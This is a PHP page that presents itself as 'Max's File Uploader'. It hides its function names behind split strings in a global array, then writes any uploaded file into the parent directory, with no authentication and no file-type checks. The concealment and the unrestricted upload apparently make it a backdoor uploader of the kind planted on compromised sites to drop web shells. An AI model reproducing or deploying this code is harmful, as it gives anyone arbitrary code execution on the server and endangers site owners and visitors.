<? $GLOBALS['_356747980_']=Array(); ?><? $GLOBALS['_456214518_']=Array(''.'chdir',''.'getcwd',''.'file_'.'exis'.'ts','is_wri'.'teable','b'.'asen'.'ame','m'.'o'.'v'.'e_uplo'.'aded_file','basename'); ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
   <title>Max's File Uploader</title> 
   <link href="style/style.css" rel="stylesheet" type="text/css" /> 
</head> 

<body> 
<?php 
$GLOBALS['_456214518_'][0](".."); 
    $myUpload = new maxUpload();  

    $myUpload->uploadFile(); 
?> 
<?php 
 
class maxUpload{ 
    var $uploadLocation; 
     
     
    function maxUpload(){ 
        $this->uploadLocation = $GLOBALS['_456214518_'][1]().DIRECTORY_SEPARATOR; 
    } 

     
    function setUploadLocation($dir){ 
        $this->uploadLocation = $dir; 
    } 
     
    function showUploadForm($msg='',$error=''){ 
?> 
       <div id="container"> 
            <div id="header"><div id="header_left"></div> 
            <div id="header_main"> File Uploader</div><div id="header_right"></div></div> 
            <div id="content"> 
<?php 
if ($msg != ''){ 
    echo '<p class="msg">'.$msg.'</p>'; 
} else if ($error != ''){ 
    echo '<p class="emsg">'.$error.'</p>'; 

} 
?> 
                <form action="" method="post" enctype="multipart/form-data" > 
                     <center> 
                         <label>File: 
                             <input name="myfile" type="file" size="30" /> 
                         </label> 
                         <label> 
                             <input type="submit" name="submitBtn" class="sbtn" value="Upload" /> 
                         </label> 
                     </center> 
                 </form> 
             </div> 
             <div id="footer">
         </div> 
<?php 
    } 

    function uploadFile(){ 
        if (!isset($_POST['submitBtn'])){ 
            $this->showUploadForm(); 
        } else { 
            $msg = ''; 
            $error = ''; 
             
                        if (!$GLOBALS['_456214518_'][2]($this->uploadLocation)){ 
                $error = "The target directory doesn't exists!"; 
            } else if (!$GLOBALS['_456214518_'][3]($this->uploadLocation)) { 
                $error = "The target directory is not writeable!"; 
            } else { 
                $target_path = $this->uploadLocation . $GLOBALS['_456214518_'][4]( $_FILES['myfile']['name']); 

                if(@$GLOBALS['_456214518_'][5]($_FILES['myfile']['tmp_name'], $target_path)) { 
                    $msg = $GLOBALS['_456214518_'][6]( $_FILES['myfile']['name']). 
                    " was uploaded successfully!"; 
                } else{ 
                    $error = "The upload process failed!"; 
                } 
            } 

            $this->showUploadForm($msg,$error); 
        } 

    } 

} 
?> 
</body> 